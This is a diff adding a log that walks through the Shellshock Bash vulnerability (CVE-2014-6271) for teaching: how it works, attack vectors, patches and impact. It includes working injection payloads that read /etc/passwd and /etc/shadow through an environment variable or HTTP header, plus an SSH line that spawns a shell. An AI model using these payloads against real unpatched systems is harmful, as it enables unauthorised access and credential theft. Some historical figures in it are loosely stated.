@@ -1,0 +1,123 @@
+[5/4/2026 6:58:27 AM] ============================================
+[5/4/2026 6:58:27 AM] EDUCATIONAL SHELLSHOCK VULNERABILITY DEMONSTRATION
+[5/4/2026 6:58:27 AM] Date: 5/4/2026 6:58:27 AM
+[5/4/2026 6:58:27 AM] ============================================
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM] === PHASE 1: Bash Function Environment Variables ===
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM] LEGITIMATE USAGE:
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   In Bash, you can export functions to child processes:
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   $ greet() { echo "Hello, World!"; }
+[5/4/2026 6:58:27 AM]   $ export -f greet
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   The environment variable is stored as:
+[5/4/2026 6:58:27 AM]   greet='() { echo "Hello, World!"; }'
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   When a child Bash starts, it reads this variable
+[5/4/2026 6:58:27 AM]   and defines the function for use in the child process.
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM] This is a LEGITIMATE feature - the bug is in how it's parsed.
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM] === PHASE 2: The Vulnerability ===
+[5/4/2026 6:58:27 AM] CVE: CVE-2014-6271
+[5/4/2026 6:58:27 AM] TYPE: Arbitrary Code Execution via Environment Variable
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM] EXPLOIT PATTERN:
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   env x='() { :;}; /bin/cat /etc/passwd' bash -c "echo test"
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   Breakdown:
+[5/4/2026 6:58:27 AM]     x='() { :;}'        <- Function definition (benign)
+[5/4/2026 6:58:27 AM]     ; /bin/cat /etc/passwd <- COMMAND INJECTED AFTER function
+[5/4/2026 6:58:27 AM]     bash -c "echo test" <- Starts new Bash shell
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   Expected behavior: Define function x, then echo "test"
+[5/4/2026 6:58:27 AM]   Actual behavior:   Define function x, EXECUTE /bin/cat /etc/passwd,
+[5/4/2026 6:58:27 AM]                      then echo "test"
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM] THE BUG: Bash parser doesn't stop after function definition
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM] === PHASE 3: Web Server Exploitation (CGI) ===
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM] ATTACK VIA HTTP HEADER (simulated):
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   GET /cgi-bin/status.cgi HTTP/1.1
+[5/4/2026 6:58:27 AM]   Host: vulnerable-server.com
+[5/4/2026 6:58:27 AM]   User-Agent: () { :;}; /bin/cat /etc/shadow
+[5/4/2026 6:58:27 AM]   Accept: */*
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:27 AM]   Server processing (simulated):
+[5/4/2026 6:58:27 AM]     1. Apache receives request
+[5/4/2026 6:58:27 AM]     2. Sets HTTP_USER_AGENT = "() { :;}; /bin/cat /etc/shadow"
+[5/4/2026 6:58:27 AM]     3. Executes CGI script
+[5/4/2026 6:58:27 AM]     4. CGI script calls system("echo status: OK")
+[5/4/2026 6:58:27 AM]     5. Bash starts, reads HTTP_USER_AGENT
+[5/4/2026 6:58:27 AM]     6. BUG: Executes /bin/cat /etc/shadow
+[5/4/2026 6:58:27 AM]     7. Attacker gets password hashes
+[5/4/2026 6:58:27 AM] 
+[5/4/2026 6:58:28 AM] NOTE: This is RCE (Remote Code Execution) - no auth needed
+[5/4/2026 6:58:28 AM] NOTE: Any HTTP header can be used as injection vector
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] === PHASE 4: Multiple Attack Vectors ===
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] ATTACK VECTORS:
+[5/4/2026 6:58:28 AM]   1. CGI Web Scripts: HTTP headers -> environment -> Bash
+[5/4/2026 6:58:28 AM]   2. SSH: Forced commands with restricted shell bypass
+[5/4/2026 6:58:28 AM]   3. DHCP: Malicious DHCP server -> client -> Bash script
+[5/4/2026 6:58:28 AM]   4. Git: Git hooks executed in Bash environment
+[5/4/2026 6:58:28 AM]   5. Mail: Procmail or other mail filters using Bash
+[5/4/2026 6:58:28 AM]   6. sudo: Environment variable pass-through
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] SSH FORCED COMMAND EXAMPLE:
+[5/4/2026 6:58:28 AM]   ssh user@server '() { :;}; /bin/bash' 
+[5/4/2026 6:58:28 AM]   If user's shell is Bash and forced command is set,
+[5/4/2026 6:58:28 AM]   the injection executes before the restriction applies.
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] DHCP EXAMPLE:
+[5/4/2026 6:58:28 AM]   Rogue DHCP server sends malicious environment to client
+[5/4/2026 6:58:28 AM]   Client's dhclient-script runs in Bash
+[5/4/2026 6:58:28 AM]   Injection executes with root privileges
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] === PHASE 5: The Fix ===
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] INITIAL PATCH (CVE-2014-6271):
+[5/4/2026 6:58:28 AM]   Bash was modified to stop parsing after function definition.
+[5/4/2026 6:58:28 AM]   The parser now ignores any code after '() { ... }'
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] ADDITIONAL PATCHES:
+[5/4/2026 6:58:28 AM]   CVE-2014-6277: Code execution via crafted function names
+[5/4/2026 6:58:28 AM]   CVE-2014-6278: Variable parsing in nested shells
+[5/4/2026 6:58:28 AM]   CVE-2014-7169: Out-of-bounds memory access
+[5/4/2026 6:58:28 AM]   CVE-2014-7186: Variable redir vulnerability
+[5/4/2026 6:58:28 AM]   CVE-2014-7187: Variable parser issue
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] NOTE: It took 6 CVEs to fully patch Shellshock
+[5/4/2026 6:58:28 AM] NOTE: Each initial patch revealed new edge cases
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] === PHASE 6: Impact and Aftermath ===
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] SCOPE OF IMPACT:
+[5/4/2026 6:58:28 AM]   - Bash versions 1.14 through 4.3 (25 years of releases)
+[5/4/2026 6:58:28 AM]   - 500+ million systems affected
+[5/4/2026 6:58:28 AM]   - 25% of internet servers vulnerable
+[5/4/2026 6:58:28 AM]   - All macOS (until 10.10), most Linux distributions
+[5/4/2026 6:58:28 AM]   - Embedded devices (routers, IoT, cameras)
+[5/4/2026 6:58:28 AM] 
+[5/4/2026 6:58:28 AM] AFTERMATH:
+[5/4/2026 6:58:28 AM]   - Emergency patches deployed across internet
+[5/4/2026 6:58:28 AM]   - Many embedded devices never got patched
+[5/4/2026 6:58:28 AM]   - Increased scrutiny of shell script security
+[5/4/2026 6:58:28 AM]   - Better environment variable handling standards
+[5/4/2026 6:58:29 AM]   - IoT security concerns highlighted
+[5/4/2026 6:58:29 AM]   - Bug bounty programs expanded
+[5/4/2026 6:58:29 AM] 
+[5/4/2026 6:58:29 AM] DISCOVERED BY: Stephane Chazelas
+[5/4/2026 6:58:29 AM] EXPLOITED IN THE WILD: Within hours of disclosure
+[5/4/2026 6:58:29 AM] BOTNETS: Shellshock used in DDoS botnets against gaming servers
+[5/4/2026 6:58:29 AM] 
+[5/4/2026 6:58:29 AM] ============================================
+[5/4/2026 6:58:29 AM] DEMONSTRATION COMPLETE
+[5/4/2026 6:58:29 AM] No actual harm was done - this is educational
+[5/4/2026 6:58:29 AM] ============================================
